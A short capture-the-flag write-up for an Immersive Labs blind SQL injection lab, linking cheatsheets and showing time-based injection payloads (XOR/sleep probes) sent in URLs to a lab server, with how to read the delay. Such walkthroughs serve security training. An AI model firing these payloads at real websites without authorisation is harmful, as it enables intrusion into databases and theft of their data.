---
date: 2025-02-07
categories: [CTF, ImmersiveLabs]
title: "IML - SQL Injection: Blind"
tags: ['http', 'sqli', 'exploit', 'rce', 'sql']

description: "SQL Injection Blind - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - SQL Injection: Blind

- Great Cheatsheets:
<https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet>

<https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/MySQL%20-%20Time%20Based%20SQLi/README.md>

<https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1>


![image1](../resources/39150bc6d9f84dfba5d6a1710f047711.png)

- Test for Time-Based Blind SQLi:

**'XOR(if(now()=sysdate(),sleep(5\*5),0))OR'**

`http:// 10.102.173.241/regards.php?email=stefan@immersivenews.co.uk%27XOR(if(now()=sysdate(),sleep(5*5),0))OR%27`

**'XOR(if(1=1,sleep(5\*5),0))OR'**

`http:// 10.102.173.241/regards.php?email=stefan@immersivenews.co.uk%20%27XOR(if(1=1,sleep(5*5),0))OR%27`

**'XOR(if(2=1,sleep(5\*5),0))OR'** \<--- This shouldn't work because the statement is false (2=1)

If the websites response is ~15 seconds, it means it is vulnerable to this kind of attack


![image2](../resources/30f64b8f60ff4b02b7df79daf3aa388d.png)

Website hangs for approx 15sec, so it's probably vulnerable
